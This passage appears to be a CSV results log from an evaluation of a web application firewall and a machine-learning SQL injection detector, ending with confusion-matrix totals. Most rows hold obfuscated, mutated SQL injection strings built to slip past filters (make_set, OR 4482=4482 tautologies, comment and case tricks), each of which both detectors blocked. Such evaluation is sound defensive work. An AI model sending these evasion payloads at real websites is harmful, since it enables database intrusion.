+4214)  =  (SELECT  OR 1971 IN (1970,1971,1972)),'r'!='rI'  )   and ""phjg"" like ""phjg",2025-10-21T16:09:01.154067,403,403,both_correct,"(SELeCT 1363 LIKE 1363)""/**/and make_set  ( 	(SELECT	0x1076)  =  (SELECT  OR 1971 IN ( OR 0,1971,1972)),'r'!='rI'  )   and ""phjg"" like ""phjg",2025-10-21T16:09:27.197058,403,403,both_correct,"(SeLECT 1363 like 1363)"" and make_set  ( 	(SELECT	0x1076)  =  (SELECT 	OR '] OR 0'=']5' IN ( OR 0,1971,0x7b4)),'r'!='rI'  )   and ""phjg"" like ""phjg",2025-10-21T16:09:44.613074,403,403,both_correct,"(SELECt 1363 Like 'y' LIKE 'y')"" and make_set  (  (SELECT	0x1076)  =  (SELECT 	OR '] OR 0'='] OR/*n/3R*/0' IN ( OR 0,0x7b3,0x7b4)),'r'!='rI'  )   and ""phjg"" like ""phjg",2025-10-21T16:10:01.393539,403,403,both_correct,"(sElEcT 1363 liKE 'y' LiKe 'y')"" and make_set  (  (SELECT	0x1076)  =  (SELECT 	OR/**/'] OR 4482=4482'='] OR/*n/3R*/ OR (SELECT 0)' IN ( OR 0,0x7b3,0x7b4)),'r'!='rI'  )	  and ""phjg"" like ""phjg",2025-10-21T16:10:18.596683,403,403,both_correct,"(SeLECT  And 1 liKe 8753 Like 'y' LIKE 'y')"" and make_set  (  (SELECT	0x1076)  =  (SELECT 
+OR/**/'] OR/**/4482=4482'='] OR/*n/3R*/ OR (SELECT (SELECT 0))' IN ( OR 0,0x7b3,0x7b4)),'r'!='rI'  )	  and ""phjg"" like ""phjg",2025-10-21T16:10:36.742838,403,403,both_correct,"(SELeCT  ANd 5283 not like 5284 LikE (SELECT 8753) LiKe 'y' LIKe 'y')"" and make_set  (  (SELECT	0x1076)  =  (SELECT  OR/**/']/**/OR/*3K:G*/4482=(SELECT 1)'='] OR/*n/3R*/ OR (SELECT (SELECT 0))' IN ( OR 0,0x7b3,0x7b4)),'r'!='rI'  )	  and ""phjg"" like ""phjg",2025-10-21T16:10:53.260587,403,403,both_correct,"(sElecT  and '9'<>'9a' not like 5284 liKe (SElEct 0x2231) lIkE 'y' liKe 'y')"" and make_set  (  (SELECT 0x1076)  = /**/(SELECT  OR/**/']/**/OR/*3K:G*/ AND 1=(SELECT 1)'='] OR/*n/3R*/ OR (SELECT (SELECT 0))' IN ( OR 0,0x7b3,0x7b4)),'r'!='rI'  )	  and ""phjg"" like ""phjg",2025-10-21T16:11:09.815688,403,403,both_correct,"(SelEct  and '1758=1758'<>'9a' not like  or 0 LikE (seLeCT 0x2231) LIKE 'y' lIKE 'y')"" and make_set  (  (SELECT 0x1076)  =  (SELECT  OR/*/*/']/**/OR/*3K:G*/ AND 1=(SELECT 1)'='] OR/*n/3R*/ OR (SELECT (SELECT 0))' IN ( OR 0x0,0x7b3,0x7b4)),'r'!='rI'  )   and ""phjg"" like ""phjg",2025-10-21T16:11:25.977665,403,403,both_correct,"(SElECT  aNd '1758=1758' not like '9a' not like  Or /**/OR 0 likE (SElECT 0x2231) liKE 'y' lIke 'y')"" and make_set  (  (SELECT 0x1076)  =  (SELECT  OR/*/*/']/**/OR/*3K:G*/ AND 1=(SELECT 0x1)'='] OR/*n/3R*/ OR (SELECT (SELECT 1157!=1158))' IN ( OR 0x0,0x7b3,0x7b4)),'r'!='rI'  )   and	""phjg"" like ""phjg",2025-10-21T16:11:42.904297,403,403,both_correct,"(selECT  anD '1758=1758' not like '9a' not like  OR /**/oR 'KO'<>'KOl' lIKE (SEleCT 0x2231) LikE 'y' lIkE 'y')"" and make_set  (  (SELECT 0x1076)  =  (SELECT  OR/*/*/'] OR/**/ AND 1=(SELECT 0x1)'='] OR/*n/3R*/ OR (SELECT (SELECT (SELECT 1157)!=(SELECT 1)))' IN ( OR 0x0,0x7b3,0x7b4)),'r'!='rI'  )   and	""phjg"" like
+""phjg",2025-10-21T16:11:59.781193,403,403,both_correct,"(SELECt  ANd ' OR 0=1758' not like '9a' not like  Or  oR 'KO' not like 'KOl' LIkE (SelEct 0x2231) lIke 'y' likE 'y')""	and make_set  (  (SELECT 0x1076)  =  (SELECT  OR/*/*/'] OR/**/ AND 0x1=(SELECT 0x1)'='] OR/*n/3R*/ OR (SELECT (SELECT (SELECT 'v'<>'v[')!=(SELECT 1)))' IN ( OR 0x0,0x7b3,0x7b4)),'r'!='rI'  )   and	""phjg"" like
+""phjg",2025-10-21T16:12:16.226741,403,403,both_correct,"(selECT  aND ' OR 8957<>8958=1758' not like '9a' not like  or  or 'KO' not like 'KOl' LIKE (SeLeCT 0x2231) liKe 'y' liKE 'y')""	and make_set  (  (SELECT 0x1076)  =  (SELECT  OR/*/*/'] OR/**/ AND 0x1=(SELECT/**/0x1)'='] OR/*n/3R*/ OR (SELECT (SELECT (SELECT 'v'<>'v[')!=(SELECT  AND 0x1)))' IN ( OR 0x0,0x7b3,0x7b4)),'r'!='rI'  )   and	""phjg"" like	""phjg",2025-10-21T16:12:32.780279,403,403,both_correct,"(seLeCt  ANd ' OR '3[' NOT LIKE '3[(SELECT 7)'<>(SELECT 1)=1758' not like '9a' not like  or  or 'KO' not like 'KOl' LIKE (SeLeCT 0x2231) liKe 'y' liKE 'y')""	and make_set  (  (SELECT 0x1076)  =  (SELECT  OR/*/*/'] OR/*,RMp*/ and 0x1=(SeLECt/**/0x1)'='] Or/*n/3R*/ or (sElEcT (SELEcT (sELECT 'v'<>'v[') NOT LIKE (SELECt  aNd 0x1)))' IN ( OR/**/0x0,0x7b3,0x7b4)),'r'!='rI'  )   anD
+""phjg"" liKE	""phjg",2025-10-21T16:12:49.466327,403,403,both_correct
+
+Overall Results
+WAF TP,99
+WAF TN,48
+WAF FP,0
+WAF FN,13
+ML TP,109
+ML TN,33
+ML FP,15
+ML FN,3
+
+Combined Results (2x2 Matrix)
+,WAF Correct,WAF Incorrect
+ML Correct,130,12
+ML Incorrect,17,1
